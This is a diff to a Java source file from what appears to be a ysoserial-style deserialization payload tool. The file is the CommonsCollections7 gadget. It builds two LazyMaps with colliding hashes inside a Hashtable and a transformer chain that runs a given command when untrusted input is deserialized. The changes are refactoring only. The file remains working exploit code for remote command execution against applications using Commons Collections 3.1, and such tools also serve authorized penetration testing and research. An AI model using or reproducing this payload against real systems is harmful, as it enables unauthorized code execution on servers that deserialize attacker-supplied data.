@@ -2,13 +2,10 @@ package org.su18.ysuserial.payloads;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 import org.su18.ysuserial.payloads.util.cc.TransformerUtil;
 
@@ -37,41 +34,34 @@ import java.util.Map;
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.SCRISTALLI, Authors.HANYRAX, Authors.EDOARDOVIGNATI})
 
-public class CommonsCollections7 extends PayloadRunner implements ObjectPayload<Hashtable> {
+public class CommonsCollections7 implements ObjectPayload<Hashtable> {
 
-    public Hashtable getObject(final String command) throws Exception {
+	public Hashtable getObject(final String command) throws Exception {
 
-        // Reusing transformer chain and LazyMap gadgets from previous payloads
-        final String[] execArgs = new String[]{command};
+		final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
-        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
+		final Transformer[] transformers = TransformerUtil.makeTransformer(command);
 
-        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+		Map innerMap1 = new HashMap();
+		Map innerMap2 = new HashMap();
 
-        Map innerMap1 = new HashMap();
-        Map innerMap2 = new HashMap();
+		// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
+		Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
+		lazyMap1.put("yy", 1);
 
-        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
-        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
-        lazyMap1.put("yy", 1);
+		Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
+		lazyMap2.put("zZ", 1);
 
-        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
-        lazyMap2.put("zZ", 1);
+		// Use the colliding Maps as keys in Hashtable
+		Hashtable hashtable = new Hashtable();
+		hashtable.put(lazyMap1, 1);
+		hashtable.put(lazyMap2, 2);
 
-        // Use the colliding Maps as keys in Hashtable
-        Hashtable hashtable = new Hashtable();
-        hashtable.put(lazyMap1, 1);
-        hashtable.put(lazyMap2, 2);
+		Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
-        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+		// Needed to ensure hash collision after previous manipulations
+		lazyMap2.remove("yy");
 
-        // Needed to ensure hash collision after previous manipulations
-        lazyMap2.remove("yy");
-
-        return hashtable;
-    }
-
-    public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections7.class, args);
-    }
+		return hashtable;
+	}
 }
